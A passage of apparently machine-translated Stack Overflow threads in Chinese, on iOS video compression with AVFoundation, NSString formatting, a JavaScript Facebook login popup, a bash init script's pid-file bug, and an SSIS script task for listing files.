                            videoWriter.startSession(atSourceTime: kCMTimeZero)
                            let processingQueue = DispatchQueue(label: "processingQueue2")
                            audioWriterInput.requestMediaDataWhenReady(on: processingQueue, using: {() -> Void in
                                while audioWriterInput.isReadyForMoreMediaData {
                                    let sampleBuffer:CMSampleBuffer? = audioReaderOutput.copyNextSampleBuffer()
                                    if audioReader.status == .reading && sampleBuffer != nil {
                                        audioWriterInput.append(sampleBuffer!)
                                    }
                                    else {
                                        audioWriterInput.markAsFinished()
                                        if audioReader.status == .completed {
                                            videoWriter.finishWriting(completionHandler: {() -> Void in
                                                onDone();
                                            })
                                        }
                                    }
                                }
                            })
                        }
                    }
                }
            })
        } 
```

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2020-07-12T14:10:41.213

**Swift 5**和**高质量**的代码

 **以下是遵循[此链接](https://medium.com/samkirkiles/swift-using-avassetwriter-to-compress-video-files-for-network-transfer-4dcc7b4288c5)中的代码的方法。链接的问题是它只适用于`.mov`文件输出，如果你想输出一个`.mp4`文件，它会崩溃。下面的代码可让您获得`.mp4`输出。它经过了尝试、测试和工作。例如，原本 27mb 的 15 秒视频减少到 2mb。如果您想要更好的质量，请提高`bitrate`. 我将其设置为**1250000**。

c+p 这段代码：

```
import AVFoundation

// add these properties
var assetWriter: AVAssetWriter!
var assetWriterVideoInput: AVAssetWriterInput!
var audioMicInput: AVAssetWriterInput!
var videoURL: URL!
var audioAppInput: AVAssetWriterInput!
var channelLayout = AudioChannelLayout()
var assetReader: AVAssetReader?
let bitrate: NSNumber = NSNumber(value: 1250000) // *** you can change this number to increase/decrease the quality. The more you increase, the better the video quality but the the compressed file size will also increase

// compression function, it returns a .mp4 but you can change it to .mov inside the do try block towards the middle. Change assetWriter = try AVAssetWriter ... AVFileType.mp4 to AVFileType.mov
func compressFile(_ urlToCompress: URL, completion:@escaping (URL)->Void) {

    var audioFinished = false
    var videoFinished = false

    let asset = AVAsset(url: urlToCompress)

    //create asset reader
    do {
        assetReader = try AVAssetReader(asset: asset)
    } catch {
        assetReader = nil
    }

    guard let reader = assetReader else {
        print("Could not iniitalize asset reader probably failed its try catch")
        // show user error message/alert
        return
    }

    guard let videoTrack = asset.tracks(withMediaType: AVMediaType.video).first else { return }
    let videoReaderSettings: [String:Any] = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32ARGB]

    let assetReaderVideoOutput = AVAssetReaderTrackOutput(track: videoTrack, outputSettings: videoReaderSettings)

    var assetReaderAudioOutput: AVAssetReaderTrackOutput?
    if let audioTrack = asset.tracks(withMediaType: AVMediaType.audio).first {

        let audioReaderSettings: [String : Any] = [
            AVFormatIDKey: kAudioFormatLinearPCM,
            AVSampleRateKey: 44100,
            AVNumberOfChannelsKey: 2
        ]

        assetReaderAudioOutput = AVAssetReaderTrackOutput(track: audioTrack, outputSettings: audioReaderSettings)

        if reader.canAdd(assetReaderAudioOutput!) {
            reader.add(assetReaderAudioOutput!)
        } else {
            print("Couldn't add audio output reader")
            // show user error message/alert
            return
        }
    }

    if reader.canAdd(assetReaderVideoOutput) {
        reader.add(assetReaderVideoOutput)
    } else {
        print("Couldn't add video output reader")
        // show user error message/alert
        return
    }

    let videoSettings:[String:Any] = [
        AVVideoCompressionPropertiesKey: [AVVideoAverageBitRateKey: self.bitrate],
        AVVideoCodecKey: AVVideoCodecType.h264,
        AVVideoHeightKey: videoTrack.naturalSize.height,
        AVVideoWidthKey: videoTrack.naturalSize.width,
        AVVideoScalingModeKey: AVVideoScalingModeResizeAspectFill
    ]

    let audioSettings: [String:Any] = [AVFormatIDKey : kAudioFormatMPEG4AAC,
                                       AVNumberOfChannelsKey : 2,
                                       AVSampleRateKey : 44100.0,
                                       AVEncoderBitRateKey: 128000
    ]

    let audioInput = AVAssetWriterInput(mediaType: AVMediaType.audio, outputSettings: audioSettings)
    let videoInput = AVAssetWriterInput(mediaType: AVMediaType.video, outputSettings: videoSettings)
    videoInput.transform = videoTrack.preferredTransform

    let videoInputQueue = DispatchQueue(label: "videoQueue")
    let audioInputQueue = DispatchQueue(label: "audioQueue")

    do {

        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy'-'MM'-'dd'T'HH':'mm':'ss'Z'"
        let date = Date()
        let tempDir = NSTemporaryDirectory()
        let outputPath = "\(tempDir)/\(formatter.string(from: date)).mp4"
        let outputURL = URL(fileURLWithPath: outputPath)

        assetWriter = try AVAssetWriter(outputURL: outputURL, fileType: AVFileType.mp4)

    } catch {
        assetWriter = nil
    }
    guard let writer = assetWriter else {
        print("assetWriter was nil")
        // show user error message/alert
        return
    }

    writer.shouldOptimizeForNetworkUse = true
    writer.add(videoInput)
    writer.add(audioInput)

    writer.startWriting()
    reader.startReading()
    writer.startSession(atSourceTime: CMTime.zero)

    let closeWriter:()->Void = {
        if (audioFinished && videoFinished) {
            self.assetWriter?.finishWriting(completionHandler: { [weak self] in

                if let assetWriter = self?.assetWriter {
                    do {
                        let data = try Data(contentsOf: assetWriter.outputURL)
                        print("compressFile -file size after compression: \(Double(data.count / 1048576)) mb")
                    } catch let err as NSError {
                        print("compressFile Error: \(err.localizedDescription)")
                    }
                }

                if let safeSelf = self, let assetWriter = safeSelf.assetWriter {
                    completion(assetWriter.outputURL)
                }
            })

            self.assetReader?.cancelReading()
        }
    }

    audioInput.requestMediaDataWhenReady(on: audioInputQueue) {
        while(audioInput.isReadyForMoreMediaData) {
            if let cmSampleBuffer = assetReaderAudioOutput?.copyNextSampleBuffer() {

                audioInput.append(cmSampleBuffer)

            } else {
                audioInput.markAsFinished()
                DispatchQueue.main.async {
                    audioFinished = true
                    closeWriter()
                }
                break;
            }
        }
    }

    videoInput.requestMediaDataWhenReady(on: videoInputQueue) {
        // request data here
        while(videoInput.isReadyForMoreMediaData) {
            if let cmSampleBuffer = assetReaderVideoOutput.copyNextSampleBuffer() {

                videoInput.append(cmSampleBuffer)

            } else {
                videoInput.markAsFinished()
                DispatchQueue.main.async {
                    videoFinished = true
                    closeWriter()
                }
                break;
            }
        }
    }
} 
```

如果您正在压缩`URL`. 在回调中返回**压缩URL：**

```
@IBAction func buttonTapped(sender: UIButton) {

    // show activity indicator

    let videoURL = URL(string: "...")

    compressFile(videoURL) { (compressedURL) in

       // remove activity indicator
       // do something with the compressedURL such as sending to Firebase or playing it in a player on the *main queue*
    }
} 
```

仅供参考，我注意到音频会减慢速度，您还可以在后台任务上尝试此操作，看看它是否运行得更快。如果您在函数本身中添加了警报之类的东西`compressFile`，则必须在 mainQueue 上显示它，否则应用程序将崩溃。

```
DispatchQueue.global(qos: .background).async { [weak self] in

    self?.compressFile(videoURL) { (compressedURL) in

        DispatchQueue.main.async { [weak self] in
            // also remove activity indicator on mainQueue in addition to whatever is inside the function itself that needs to be updated on the mainQueue
        }
    }
} 
```

如果您正在压缩混合组合，以下是如何做到这一点。您将需要使用 an `AVMutableComposition`、 an`AVAssetExportSession`和`compressFile(:completion:)`上面的函数：

```
@IBAction func buttonTapped(sender: UIButton) {

    // show activity indicator

    let mixComposition = AVMutableComposition()
    // code to create mix ...

    // create a local file
    let tempDir = NSTemporaryDirectory()
    let dirPath = "\(tempDir)/videos_\(UUID().uuidString).mp4"
    let outputFileURL = URL(fileURLWithPath: dirPath)

    removeUrlFromFileManager(outputFileURL) // check to see if the file already exists, if it does remove it, code is at the bottom of the answer

    createAssetExportSession(mixComposition, outputFileURL)
}

// here is the AssetExportSession function with the compressFile(:completion:) inside the callback
func createAssetExportSession(_ mixComposition: AVMutableComposition, _ outputFileURL: URL) {

    // *** If your video/url doesn't have sound (not mute but literally no sound, my iPhone's mic was broken when I recorded the video), change this to use AVAssetExportPresetPassthrough instead of HighestQulity. When my video didn't have sound the exporter.status kept returning .failed *** You can check for sound using https://stackoverflow.com/a/64733623/4833705
    guard let exporter = AVAssetExportSession(asset: mixComposition, presetName: AVAssetExportPresetHighestQuality) else {
        // alert user there is a problem
        return
    }

    exporter.outputURL = outputFileURL
    exporter.outputFileType = AVFileType.mp4
    exporter.shouldOptimizeForNetworkUse = true
    exporter.exportAsynchronously {

        switch exporter.status {
        case .completed:
            print("completed")
            // view the AssetExportSession file size using HighestQuality which will be very high
            do {
                let data = try Data(contentsOf: outputFileURL)
                print("createAssetExportSession -file size: \(Double(data.count / 1048576)) mb")
            } catch let err as NSError {
                print("createAssetExportSession Error: \(err.localizedDescription)")
            }
        case .failed:
            print("failed:", exporter.error as Any)
            DispatchQueue.main.async { [weak self] in
                // remove activity indicator
                // alert user there is a problem
            }
            return
        case .cancelled:
            print("cancelled", exporter.error as Any)
            DispatchQueue.main.async { [weak self] in
                // remove activity indicator
                // alert user there is a problem
            }
            return
        default:
            print("complete")
        }

        guard let exporterOutputURL = exporter.outputURL else {
            // alert user there is a problem
            return
        }

        DispatchQueue.main.async { [weak self] in

            self?.compressFile(exporterOutputURL) { (compressedURL) in
               // remove activity indicator
               // do something with the compressedURL such as sending to Firebase or playing it in a player on the *main queue*
            }
        }
    }
} 
```

确保在完成后从文件系统中删除压缩 URL，例如在关闭 vc 之前

```
func dismissVC() {

    removeUrlFromFileManager(compressedURL)
    // dismiss vc ...
}

removeUrlFromFileManager(_ outputFileURL: URL?) {
    if let outputFileURL = outputFileURL {

        let path = outputFileURL.path
        if FileManager.default.fileExists(atPath: path) {
            do {
                try FileManager.default.removeItem(atPath: path)
                print("url SUCCESSFULLY removed: \(outputFileURL)")
            } catch {
                print("Could not remove file at url: \(outputFileURL)")
            }
        }
    }
} 
```

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2012-08-07T11:53:04.483

当您想要打开`UIImagePickerController`以下任何一项时，您可以设置视频质量：

`UIImagePickerControllerQualityType640x480`
`UIImagePickerControllerQualityTypeLow`
`UIImagePickerControllerQualityTypeMedium`
`UIImagePickerControllerQualityTypeHigh`
`UIImagePickerControllerQualityTypeIFrame960x540`
`UIImagePickerControllerQualityTypeIFrame1280x720`

打开以下代码时尝试更改质量类型`UIImagePickerController`：

```
if (([UIImagePickerController isSourceTypeAvailable:
      UIImagePickerControllerSourceTypeCamera] == NO))
    return NO;
UIImagePickerController *cameraUI = [[UIImagePickerController alloc] init];
cameraUI.sourceType = UIImagePickerControllerSourceTypeCamera;
cameraUI.mediaTypes = [[NSArray alloc] initWithObjects: (NSString *) kUTTypeMovie, nil];

cameraUI.allowsEditing = NO;
cameraUI.delegate = self;
cameraUI.videoQuality = UIImagePickerControllerQualityTypeLow;//you can change the quality here
[self presentModalViewController:cameraUI animated:YES]; 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2018-09-15T16:45:59.790

斯威夫特 4：

```
func convertVideoToLowQuailtyWithInputURL(inputURL: NSURL, outputURL: NSURL, completion: @escaping (Bool) -> Void) {

    let videoAsset = AVURLAsset(url: inputURL as URL, options: nil)
    let videoTrack = videoAsset.tracks(withMediaType: AVMediaType.video)[0]
    let videoSize = videoTrack.naturalSize
    let videoWriterCompressionSettings = [
        AVVideoAverageBitRateKey : Int(125000)
    ]

    let videoWriterSettings:[String : AnyObject] = [
        AVVideoCodecKey : AVVideoCodecH264 as AnyObject,
        AVVideoCompressionPropertiesKey : videoWriterCompressionSettings as AnyObject,
        AVVideoWidthKey : Int(videoSize.width) as AnyObject,
        AVVideoHeightKey : Int(videoSize.height) as AnyObject
    ]

    let videoWriterInput = AVAssetWriterInput(mediaType: AVMediaType.video, outputSettings: videoWriterSettings)
    videoWriterInput.expectsMediaDataInRealTime = true
    videoWriterInput.transform = videoTrack.preferredTransform
    let videoWriter = try! AVAssetWriter(outputURL: outputURL as URL, fileType: AVFileType.mov)
    videoWriter.add(videoWriterInput)
    //setup video reader
    let videoReaderSettings:[String : AnyObject] = [
        kCVPixelBufferPixelFormatTypeKey as String: Int(kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange) as AnyObject
    ]

    let videoReaderOutput = AVAssetReaderTrackOutput(track: videoTrack, outputSettings: videoReaderSettings)
    var videoReader: AVAssetReader!

    do{

        videoReader = try AVAssetReader(asset: videoAsset)
    }
    catch {

        print("video reader error: \(error)")
        completion(false)
    }
    videoReader.add(videoReaderOutput)
    //setup audio writer
    let audioWriterInput = AVAssetWriterInput(mediaType: AVMediaType.audio, outputSettings: nil)
    audioWriterInput.expectsMediaDataInRealTime = false
    videoWriter.add(audioWriterInput)
    //setup audio reader
    let audioTrack = videoAsset.tracks(withMediaType: AVMediaType.audio)[0]
    let audioReaderOutput = AVAssetReaderTrackOutput(track: audioTrack, outputSettings: nil)
    let audioReader = try! AVAssetReader(asset: videoAsset)
    audioReader.add(audioReaderOutput)
    videoWriter.startWriting()

    //start writing from video reader
    videoReader.startReading()
    videoWriter.startSession(atSourceTime: kCMTimeZero)
    let processingQueue = DispatchQueue(label: "processingQueue1")
    videoWriterInput.requestMediaDataWhenReady(on: processingQueue, using: {() -> Void in
        while videoWriterInput.isReadyForMoreMediaData {
            let sampleBuffer:CMSampleBuffer? = videoReaderOutput.copyNextSampleBuffer();
            if videoReader.status == .reading && sampleBuffer != nil {
                videoWriterInput.append(sampleBuffer!)
            }
            else {
                videoWriterInput.markAsFinished()
                if videoReader.status == .completed {
                    //start writing from audio reader
                    audioReader.startReading()
                    videoWriter.startSession(atSourceTime: kCMTimeZero)
                    let processingQueue = DispatchQueue(label: "processingQueue2")
                    audioWriterInput.requestMediaDataWhenReady(on: processingQueue, using: {() -> Void in
                        while audioWriterInput.isReadyForMoreMediaData {
                            let sampleBuffer:CMSampleBuffer? = audioReaderOutput.copyNextSampleBuffer()
                            if audioReader.status == .reading && sampleBuffer != nil {
                                audioWriterInput.append(sampleBuffer!)
                            }
                            else {
                                audioWriterInput.markAsFinished()
                                if audioReader.status == .completed {
                                    videoWriter.finishWriting(completionHandler: {() -> Void in
                                        completion(true)
                                    })
                                }
                            }
                        }
                    })
                }
            }
        }
    })
} 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2016-08-31T07:49:16.933

Erik Wegener 代码重写为 swift：

```
class func convertVideoToLowQuailtyWithInputURL(inputURL: NSURL, outputURL: NSURL, onDone: () -> ()) {
    //setup video writer
    let videoAsset = AVURLAsset(URL: inputURL, options: nil)
    let videoTrack = videoAsset.tracksWithMediaType(AVMediaTypeVideo)[0]
    let videoSize = videoTrack.naturalSize
    let videoWriterCompressionSettings = [
        AVVideoAverageBitRateKey : Int(125000)
    ]

    let videoWriterSettings:[String : AnyObject] = [
        AVVideoCodecKey : AVVideoCodecH264,
        AVVideoCompressionPropertiesKey : videoWriterCompressionSettings,
        AVVideoWidthKey : Int(videoSize.width),
        AVVideoHeightKey : Int(videoSize.height)
    ]

    let videoWriterInput = AVAssetWriterInput(mediaType: AVMediaTypeVideo, outputSettings: videoWriterSettings)
    videoWriterInput.expectsMediaDataInRealTime = true
    videoWriterInput.transform = videoTrack.preferredTransform
    let videoWriter = try! AVAssetWriter(URL: outputURL, fileType: AVFileTypeQuickTimeMovie)
    videoWriter.addInput(videoWriterInput)
    //setup video reader
    let videoReaderSettings:[String : AnyObject] = [
        kCVPixelBufferPixelFormatTypeKey as String: Int(kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange)
    ]

    let videoReaderOutput = AVAssetReaderTrackOutput(track: videoTrack, outputSettings: videoReaderSettings)
    let videoReader = try! AVAssetReader(asset: videoAsset)
    videoReader.addOutput(videoReaderOutput)
    //setup audio writer
    let audioWriterInput = AVAssetWriterInput(mediaType: AVMediaTypeAudio, outputSettings: nil)
    audioWriterInput.expectsMediaDataInRealTime = false
    videoWriter.addInput(audioWriterInput)
    //setup audio reader
    let audioTrack = videoAsset.tracksWithMediaType(AVMediaTypeAudio)[0]
    let audioReaderOutput = AVAssetReaderTrackOutput(track: audioTrack, outputSettings: nil)
    let audioReader = try! AVAssetReader(asset: videoAsset)
    audioReader.addOutput(audioReaderOutput)
    videoWriter.startWriting()

    //start writing from video reader
    videoReader.startReading()
    videoWriter.startSessionAtSourceTime(kCMTimeZero)
    let processingQueue = dispatch_queue_create("processingQueue1", nil)
    videoWriterInput.requestMediaDataWhenReadyOnQueue(processingQueue, usingBlock: {() -> Void in
        while videoWriterInput.readyForMoreMediaData {
            let sampleBuffer:CMSampleBuffer? = videoReaderOutput.copyNextSampleBuffer();
            if videoReader.status == .Reading && sampleBuffer != nil {
                videoWriterInput.appendSampleBuffer(sampleBuffer!)
            }
            else {
                videoWriterInput.markAsFinished()
                if videoReader.status == .Completed {
                    //start writing from audio reader
                    audioReader.startReading()
                    videoWriter.startSessionAtSourceTime(kCMTimeZero)
                    let processingQueue = dispatch_queue_create("processingQueue2", nil)
                    audioWriterInput.requestMediaDataWhenReadyOnQueue(processingQueue, usingBlock: {() -> Void in
                        while audioWriterInput.readyForMoreMediaData {
                            let sampleBuffer:CMSampleBufferRef? = audioReaderOutput.copyNextSampleBuffer()
                            if audioReader.status == .Reading && sampleBuffer != nil {
                                audioWriterInput.appendSampleBuffer(sampleBuffer!)
                            }
                            else {
                                audioWriterInput.markAsFinished()
                                if audioReader.status == .Completed {
                                    videoWriter.finishWritingWithCompletionHandler({() -> Void in
                                        onDone();
                                    })
                                }
                            }
                        }
                    })
                }
            }
        }
    })
} 
```

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2019-07-25T18:38:22.587

```
Use exportSession.fileLengthLimit = 1024 * 1024 * 10 //10 MB 
```

10MB 是硬编码数字。根据您所需的比特率使用。

> **文件长度限制**
> 
> 会话不应超过。根据源资产的内容，输出可能会略微超过文件长度限制。如果您要求在使用输出之前遵守严格的限制，则应测试输出文件的长度。另请参见 maxDuration 和 timeRange。指示输出的文件长度

[developer.apple.com/documentation/avfoundation/avassetexportsession/1622333-filelengthlimit](https://developer.apple.com/documentation/avfoundation/avassetexportsession/1622333-filelengthlimit)

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2016-11-01T13:31:44.523

有一个很棒的自定义类（[SDAVAssetExportSession](https://github.com/rs/SDAVAssetExportSession)）来进行视频压缩。您可以从此[链接](https://github.com/rs/SDAVAssetExportSession)下载它。

下载后将 SDAVAssetExportSession.h 和 SDAVAssetExportSession.m 文件添加到您的项目中，然后使用以下代码进行压缩。**在下面的代码中，您可以通过指定分辨率和比特率来压缩视频**

```
#import "SDAVAssetExportSession.h"

- (void)compressVideoWithInputVideoUrl:(NSURL *) inputVideoUrl
{
    /* Create Output File Url */

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *finalVideoURLString = [documentsDirectory stringByAppendingPathComponent:@"compressedVideo.mp4"];
    NSURL *outputVideoUrl = ([[NSURL URLWithString:finalVideoURLString] isFileURL] == 1)?([NSURL URLWithString:finalVideoURLString]):([NSURL fileURLWithPath:finalVideoURLString]); // Url Should be a file Url, so here we check and convert it into a file Url

    SDAVAssetExportSession *compressionEncoder = [SDAVAssetExportSession.alloc initWithAsset:[AVAsset assetWithURL:inputVideoUrl]]; // provide inputVideo Url Here
    compressionEncoder.outputFileType = AVFileTypeMPEG4;
    compressionEncoder.outputURL = outputVideoUrl; //Provide output video Url here
    compressionEncoder.videoSettings = @
    {
    AVVideoCodecKey: AVVideoCodecH264,
    AVVideoWidthKey: @800,   //Set your resolution width here
    AVVideoHeightKey: @600,  //set your resolution height here
    AVVideoCompressionPropertiesKey: @
        {
        AVVideoAverageBitRateKey: @45000, // Give your bitrate here for lower size give low values
        AVVideoProfileLevelKey: AVVideoProfileLevelH264High40,
        },
    };
    compressionEncoder.audioSettings = @
    {
    AVFormatIDKey: @(kAudioFormatMPEG4AAC),
    AVNumberOfChannelsKey: @2,
    AVSampleRateKey: @44100,
    AVEncoderBitRateKey: @128000,
    };

    [compressionEncoder exportAsynchronouslyWithCompletionHandler:^
     {
         if (compressionEncoder.status == AVAssetExportSessionStatusCompleted)
         {
            NSLog(@"Compression Export Completed Successfully");
         }
         else if (compressionEncoder.status == AVAssetExportSessionStatusCancelled)
         {
             NSLog(@"Compression Export Canceled");
         }
         else
         {
              NSLog(@"Compression Failed");

         }
     }];

} 
```

取消压缩使用下面的代码行

```
 [compressionEncoder cancelExport]; //Video compression cancel 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-11-01T13:40:45.633

我支持*etayluz*的回答[SDAVAssetExportSession](https://github.com/rs/SDAVAssetExportSession)是一个很棒的自定义类来进行视频压缩。这是我的工作代码。您可以从此[链接](https://github.com/rs/SDAVAssetExportSession)下载*SDAVAssetExportSession*。

下载后将 SDAVAssetExportSession.h 和 SDAVAssetExportSession.m 文件添加到您的项目中，然后使用以下代码进行压缩。**在下面的代码中，您可以通过指定分辨率和比特率来压缩视频**

```
#import "SDAVAssetExportSession.h"

- (void)compressVideoWithInputVideoUrl:(NSURL *) inputVideoUrl
{
    /* Create Output File Url */

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *finalVideoURLString = [documentsDirectory stringByAppendingPathComponent:@"compressedVideo.mp4"];
    NSURL *outputVideoUrl = ([[NSURL URLWithString:finalVideoURLString] isFileURL] == 1)?([NSURL URLWithString:finalVideoURLString]):([NSURL fileURLWithPath:finalVideoURLString]); // Url Should be a file Url, so here we check and convert it into a file Url

    SDAVAssetExportSession *compressionEncoder = [SDAVAssetExportSession.alloc initWithAsset:[AVAsset assetWithURL:inputVideoUrl]]; // provide inputVideo Url Here
    compressionEncoder.outputFileType = AVFileTypeMPEG4;
    compressionEncoder.outputURL = outputVideoUrl; //Provide output video Url here
    compressionEncoder.videoSettings = @
    {
    AVVideoCodecKey: AVVideoCodecH264,
    AVVideoWidthKey: @800,   //Set your resolution width here
    AVVideoHeightKey: @600,  //set your resolution height here
    AVVideoCompressionPropertiesKey: @
        {
        AVVideoAverageBitRateKey: @45000, // Give your bitrate here for lower size give low values
        AVVideoProfileLevelKey: AVVideoProfileLevelH264High40,
        },
    };
    compressionEncoder.audioSettings = @
    {
    AVFormatIDKey: @(kAudioFormatMPEG4AAC),
    AVNumberOfChannelsKey: @2,
    AVSampleRateKey: @44100,
    AVEncoderBitRateKey: @128000,
    };

    [compressionEncoder exportAsynchronouslyWithCompletionHandler:^
     {
         if (compressionEncoder.status == AVAssetExportSessionStatusCompleted)
         {
            NSLog(@"Compression Export Completed Successfully");
         }
         else if (compressionEncoder.status == AVAssetExportSessionStatusCancelled)
         {
             NSLog(@"Compression Export Canceled");
         }
         else
         {
              NSLog(@"Compression Failed");

         }
     }];

} 
```

取消压缩使用下面的代码行

```
 [compressionEncoder cancelExport]; //Video compression cancel 
```**

# objective-c - 在 UILabel 中将 int 或 float 值绘制为 NSString

> ID：11751885
> 
> 赞同：0
> 
> 时间：2012-08-01T02:44:50.930
> 
> 标签：objective-c, cocoa-touch, nsstring

> **可能重复：**
> [将浮点值转换为 NSString](https://stackoverflow.com/questions/8974702/convert-float-value-to-nsstring)

我怎样才能画出一个`int`或通过`float`一个？`UILabel``NSString`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T02:47:47.517

```
[NSString stringWithFormat:@"%d", yourIntValue];
[NSString stringWithFormat:@"%f", yourFloatValue]; 
```

您的问题可能已经被问过，可能被标记为重复。此外，听从 bryanmac 的建议以“对 iPhone 开发不那么陌生”可能是个好主意！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-01T02:48:48.057

为了更改标签上的文本，您需要分配其`text`属性：

```
mylabel.text = [NSString stringWthFormat:"%d", intVal]; 
```

`stringWithFormat:`非常灵活，它允许您`NSString`使用格式字符串作为模板创建新的 s，并将格式说明符替换为*您*可以传递给方法的附加数据。字符串内的条目`%`将替换为您传递的数据项。`%d`或`%i`表示“整数”，`%f`或`%g`表示“浮点”，等等。[这是所有说明符的列表](http://developer.apple.com/library/ios/#DOCUMENTATION/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html#//apple_ref/doc/uid/TP40004265)。

# javascript - 什么是基于 if / if else 语句显示弹出框的简单方法？

> ID：11751886
> 
> 赞同：-2
> 
> 时间：2012-08-01T02:44:53.960
> 
> 标签：javascript, html, facebook, popup

我在我的网站上使用下面链接中的 javascript。它确定用户 1\. 是否已经允许我们的 Facebook 应用程序并已登录，2\. 尚未允许我们的应用程序但已登录到 Facebook，或者 3\. 未登录到 Facebook。

我希望弹出窗口显示在我网站的某些内容上（可能是 600 像素 x 400 像素或其他内容），因此它充当某种内容阻止程序并告诉他们他们需要登录。然后弹出窗口会在他们允许后消失应用程序。

我的问题是这个。如何在 else if 和 if 语句中对弹出窗口进行编码？我可以做一些简单的事情，比如 document.write（如我的代码所示），但是如何在我的内容上显示一个弹出窗口？有没有一种方法可以轻松地从这些语句中引用其他 html 和 javascript？我什至尝试使用图层，但不是将其分层覆盖在我的内容上，而是将图层显示为新页面而不显示页面的内容。

我的目标是在内容上显示一个弹出窗口，以便用户可以看到它背后确实有内容，这样他们就更容易说服他们允许应用程序，这样他们就可以看到所有内容。

```
FB.getLoginStatus(function(response) {
  if (response.status === 'connected') {
  document.write("<h1>Looks like you're logged into Facebook and our app :)</h1>  ");
    // the user is logged in and connected to your
    // app, and response.authResponse supplies
    // the user’s ID, a valid access token, a signed
    // request, and the time the access token 
    // and signed request each expire
    var uid = response.authResponse.userID;
    var accessToken = response.authResponse.accessToken;
  } else if (response.status === 'not_authorized') {
  document.write("<h1>Logged in but haven't allowed our app</h1>  ");
    // the user is logged in to Facebook, 
    //but not connected to the app
  } else {
  document.write("<h1>Not logged in</h1>");
    // the user isn't even logged in to Facebook.
  }
}); 
```

[http://pastebin.com/J882yh5F](http://pastebin.com/J882yh5F)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T03:01:13.587

只需使用 CSS，您就可以轻松做到这一点。`body`在级别创建一个 div ，`position: absolute`并将宽度和高度设置为 100%，并将另一个内部设置`div`为具有您自己尺寸的警报消息。然后，您可以使用简单的`display: none`或`display: block`从 JavaScript 显示或隐藏自定义消息。

**演示：** [http ://codepen.io/elclanrs/full/rGoha](http://codepen.io/elclanrs/full/rGoha)

# bash - 无法在 debian 挤压上停止我的启动脚本

> ID：11751889
> 
> 赞同：1
> 
> 时间：2012-08-01T02:45:37.013
> 
> 标签：bash, node.js, deployment, debian

我正在尝试为我正在做的 web 应用程序设置部署，但我在启动脚本时遇到了一些问题。这是我到目前为止所做的：

```
#!/bin/bash
DIR=/webroot/webapp.com
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
NODE_PATH=/usr/local/lib/node_modules
NODE=/usr/local/bin/node

test -x $NODE || exit 0

function start_app {
  NODE_ENV=production nohup "$NODE" "$DIR/production/WebApp/server.js"
  echo $! > "$DIR/production/WebApp/webapp.pid"
}

function stop_app {
  kill `cat $DIR/production/WebApp/webapp.pid`
}

case $1 in
   start)
      start_app ;;
    stop)
      stop_app ;;
    restart)
      stop_app
      start_app
      ;;
    *)
      echo "usage: webapp.com {start|stop}" ;;
esac
exit 0 
```

我可以这样启动它，但是当我尝试停止它时，我得到了这个：

```
ssh mydomain.com /etc/init.d/webapp.com restart
cat: /webroot/webapp.com/production/WebApp/webapp.pid: No such file or directory
kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... or kill -l [sigspec] 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T03:22:16.373

错误很简单：

```
cat: /webroot/webapp.com/production/WebApp/webapp.pid: No such file or directory 
```

这个文件存在吗？

如果不是，问题是为什么。我的预感是这个命令失败了：

```
echo $! > "$DIR/production/WebApp/webapp.pid" 
```

但是由于您从未验证它是否确实创建了文件，因此您不会发现错误。

目录是否`/webroot/webapp.com/production/WebApp/`存在？您的用户是否对该目录具有读/写/执行权限？

另一种可能性，因为这个目录被放置在`/webroot/webapp.com/production/WebApp`其中，它被应用程序删除了。您可能必须将 pid 文件存储在其他位置。你试过吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T05:02:43.097

这里的问题是，`webapp.pid`直到您的节点应用程序退出之后，您的文件才真正被创建，并且在您的启动脚本杀死它之前它不会退出，没有`.pid`文件它就无法做到这一点。

您需要在后台运行节点，以便创建`.pid`文件的代码实际上有机会运行：

```
NODE_ENV=production nohup "$NODE" "$DIR/production/WebApp/server.js" & 
```

# c# - SSIS 脚本任务获取文件名并存储到 SSIS 对象变量

> ID：11751901
> 
> 赞同：5
> 
> 时间：2012-08-01T02:47:51.683
> 
> 标签：c#, variables, object, ssis

我正在尝试构建一个将在标准化文件系统存档过程中使用的 SSIS 包。基本上，我将能够将信息添加到配置表中，然后使用该表将某些文件存档在指定文件夹中。我的问题是很多文件都有动态命名，所以我需要获取所有文件的列表，然后查询以确定我应该接触哪些文件。

不是 C#/VB 程序员在尝试编写包的一部分脚本以获取指定网络目录中的所有文件然后将这些文件名反馈回 SSIS 对象变量时给我带来了一些问题。

我有一个字符串变量“User::SourceNetworkFolderName”，它将包含我要从中读取所有文件的文件夹的 UNC 位置。然后我想将所有这些文件名（带扩展名）传递回一个名为“User::SourceFilesInTheDirectory”的 SSIS 对象变量。一旦我将文件名列表放入对象变量中，我将 foreach 将它们循环到 SQL 表中。

有没有人对我如何从我的变量目录中获取所有文件名的列表到我的 SSIS 对象变量有任何具体建议？

先感谢您！

**编辑：** 这是我更新的代码：

```
using System;
using System.Data;
using Microsoft.SqlServer.Dts.Runtime;
using System.Windows.Forms;
using System.IO;
using System.Collections.Generic;
using System.Data.SqlClient;

namespace ST_f5e4ae71f14d40d8811af21fa2a9a622.csproj
{
